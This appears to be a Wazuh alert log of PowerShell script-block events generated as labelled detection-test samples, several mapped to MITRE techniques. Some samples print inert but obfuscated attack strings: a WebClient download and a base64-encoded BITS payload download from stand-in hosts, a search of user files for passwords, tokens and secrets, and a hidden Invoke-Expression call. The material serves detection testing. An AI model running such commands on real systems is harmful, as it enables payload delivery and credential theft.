{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"9a7dc18b-a177-4387-a54c-0aedbb4ab302","scriptBlockText":"$sampleId='PST-162'; $indicator='Get-ChildItem ''C:\\\\Users'' -Recurse -Force -ErrorAction SilentlyContinue'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722870","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-162'; $indicator='Get-ChildItem ''C:\\Users'' -Recurse -Force -ErrorAction SilentlyContinue'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 9a7dc18b-a177-4387-a54c-0aedbb4ab302\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:43.5051326Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:43.5051326Z\",\"eventRecordID\":\"722870\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-162'; $indicator='Get-ChildItem ''C:\\\\Users'' -Recurse -Force -ErrorAction SilentlyContinue'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 9a7dc18b-a177-4387-a54c-0aedbb4ab302\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-162'; $indicator='Get-ChildItem ''C:\\\\\\\\Users'' -Recurse -Force -ErrorAction SilentlyContinue'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"9a7dc18b-a177-4387-a54c-0aedbb4ab302\"}}}","id":"1784281003.512812","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script recursively collected files from a filesystem search","firedtimes":2,"groups":["windows"," powershell"],"id":"91820","level":4,"mail":false,"mitre":{"id":["T1083","T1119"],"tactic":["Discovery","Collection"],"technique":["File and Directory Discovery","Automated Collection"]}},"timestamp":"2026-07-17T11:36:43.977+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1eef9795-2d0b-4b70-b734-c9a4914a5b37","scriptBlockText":"$sampleId='PST-163'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722873","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-163'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1eef9795-2d0b-4b70-b734-c9a4914a5b37\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:43.8355243Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:43.8355243Z\",\"eventRecordID\":\"722873\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-163'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1eef9795-2d0b-4b70-b734-c9a4914a5b37\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-163'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1eef9795-2d0b-4b70-b734-c9a4914a5b37\"}}}","id":"1784281004.516243","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:44.022+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8dbc7699-63fe-4235-881a-5df26584533f","scriptBlockText":"$sampleId='PST-164'; $indicator='$wc=New-Object Net' + '.WebClient; $w' + 'c.Proxy=[Net.W' + 'ebRequest]::De' + 'faultWebProxy; $wc.' + 'Headers[''User-Ag' + 'ent'']=''Mozilla/5.0''; ' + '$wc.DownloadSt' + 'ring(''https://cdn' + '.example.invalid/a' + ''')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722888","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-164'; $indicator='$wc=New-Object Net' + '.WebClient; $w' + 'c.Proxy=[Net.W' + 'ebRequest]::De' + 'faultWebProxy; $wc.' + 'Headers[''User-Ag' + 'ent'']=''Mozilla/5.0''; ' + '$wc.DownloadSt' + 'ring(''https://cdn' + '.example.invalid/a' + ''')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8dbc7699-63fe-4235-881a-5df26584533f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:44.1940011Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:44.1940011Z\",\"eventRecordID\":\"722888\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-164'; $indicator='$wc=New-Object Net' + '.WebClient; $w' + 'c.Proxy=[Net.W' + 'ebRequest]::De' + 'faultWebProxy; $wc.' + 'Headers[''User-Ag' + 'ent'']=''Mozilla/5.0''; ' + '$wc.DownloadSt' + 'ring(''https://cdn' + '.example.invalid/a' + ''')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8dbc7699-63fe-4235-881a-5df26584533f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-164'; $indicator='$wc=New-Object Net' + '.WebClient; $w' + 'c.Proxy=[Net.W' + 'ebRequest]::De' + 'faultWebProxy; $wc.' + 'Headers[''User-Ag' + 'ent'']=''Mozilla/5.0''; ' + '$wc.DownloadSt' + 'ring(''https://cdn' + '.example.invalid/a' + ''')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8dbc7699-63fe-4235-881a-5df26584533f\"}}}","id":"1784281005.516243","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:45.065+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"65c3de4e-647b-49be-97a2-87bd9be37d8b","scriptBlockText":"$sampleId='PST-165'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722891","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-165'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 65c3de4e-647b-49be-97a2-87bd9be37d8b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:44.5323078Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:44.5323078Z\",\"eventRecordID\":\"722891\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-165'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 65c3de4e-647b-49be-97a2-87bd9be37d8b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-165'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"65c3de4e-647b-49be-97a2-87bd9be37d8b\"}}}","id":"1784281005.516243","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:45.071+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3f14f0f1-1938-4a2b-b87d-b4a78cc6cf15","scriptBlockText":"$sampleId='PST-166'; $parts=@('Get-Ch','ildItem',' -Path ''','C:\\\\Users'' -','Recurse -I','nclude ''','*.config''',',''*.xml''',' | Select-Str','ing -Pattern',' ''passwor','d|token|secret',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722956","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-166'; $parts=@('Get-Ch','ildItem',' -Path ''','C:\\Users'' -','Recurse -I','nclude ''','*.config''',',''*.xml''',' | Select-Str','ing -Pattern',' ''passwor','d|token|secret',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3f14f0f1-1938-4a2b-b87d-b4a78cc6cf15\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:49.7400756Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:49.7400756Z\",\"eventRecordID\":\"722956\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-166'; $parts=@('Get-Ch','ildItem',' -Path ''','C:\\\\Users'' -','Recurse -I','nclude ''','*.config''',',''*.xml''',' | Select-Str','ing -Pattern',' ''passwor','d|token|secret',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3f14f0f1-1938-4a2b-b87d-b4a78cc6cf15\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-166'; $parts=@('Get-Ch','ildItem',' -Path ''','C:\\\\\\\\Users'' -','Recurse -I','nclude ''','*.config''',',''*.xml''',' | Select-Str','ing -Pattern',' ''passwor','d|token|secret',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3f14f0f1-1938-4a2b-b87d-b4a78cc6cf15\"}}}","id":"1784281010.516243","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:50.588+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"08285900-4595-42c2-bfc6-9f25eb089136","scriptBlockText":"$sampleId='PST-167'; $indicator='$cmd=(''Inv''+''oke-Expres`sion''); &amp; (Get-Com`mand $cmd) \\\"Write-Output ''TH`ESIS-INERT''\\\"'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722960","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-167'; $indicator='$cmd=(''Inv''+''oke-Expres`sion''); & (Get-Com`mand $cmd) \"Write-Output ''TH`ESIS-INERT''\"'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 08285900-4595-42c2-bfc6-9f25eb089136\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:50.0671168Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:50.0671168Z\",\"eventRecordID\":\"722960\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-167'; $indicator='$cmd=(''Inv''+''oke-Expres`sion''); & (Get-Com`mand $cmd) \\\"Write-Output ''TH`ESIS-INERT''\\\"'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 08285900-4595-42c2-bfc6-9f25eb089136\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-167'; $indicator='$cmd=(''Inv''+''oke-Expres`sion''); &amp; (Get-Com`mand $cmd) \\\\\\\"Write-Output ''TH`ESIS-INERT''\\\\\\\"'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"08285900-4595-42c2-bfc6-9f25eb089136\"}}}","id":"1784281010.516243","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:50.595+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"88268e74-7e4a-4693-b6fc-19fa1b0e70d6","scriptBlockText":"$sampleId='PST-168'; $json = '{\\\"server\\\":\\\"srv-file-01\\\",\\\"mode\\\":\\\"audit\\\",\\\"enabled\\\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722963","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-168'; $json = '{\"server\":\"srv-file-01\",\"mode\":\"audit\",\"enabled\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 88268e74-7e4a-4693-b6fc-19fa1b0e70d6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:50.4029133Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:50.4029133Z\",\"eventRecordID\":\"722963\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-168'; $json = '{\\\"server\\\":\\\"srv-file-01\\\",\\\"mode\\\":\\\"audit\\\",\\\"enabled\\\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 88268e74-7e4a-4693-b6fc-19fa1b0e70d6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-168'; $json = '{\\\\\\\"server\\\\\\\":\\\\\\\"srv-file-01\\\\\\\",\\\\\\\"mode\\\\\\\":\\\\\\\"audit\\\\\\\",\\\\\\\"enabled\\\\\\\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"88268e74-7e4a-4693-b6fc-19fa1b0e70d6\"}}}","id":"1784281010.516243","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:50.600+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e2052e60-02be-43d8-b80e-c539e4752220","scriptBlockText":"$sampleId='PST-169'; $encoded='UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722967","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-169'; $encoded='UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e2052e60-02be-43d8-b80e-c539e4752220\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:50.7510264Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:50.7510264Z\",\"eventRecordID\":\"722967\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-169'; $encoded='UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e2052e60-02be-43d8-b80e-c539e4752220\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-169'; $encoded='UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e2052e60-02be-43d8-b80e-c539e4752220\"}}}","id":"1784281011.516243","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":16,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:51.756+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"18b36588-1f30-4e09-b0cd-fcb2d5f22288","scriptBlockText":"$sampleId='PST-170'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722969","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-170'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 18b36588-1f30-4e09-b0cd-fcb2d5f22288\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:51.0748105Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:51.0748105Z\",\"eventRecordID\":\"722969\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-170'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 18b36588-1f30-4e09-b0cd-fcb2d5f22288\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-170'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"18b36588-1f30-4e09-b0cd-fcb2d5f22288\"}}}","id":"1784281011.518639","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:51.761+0200"}
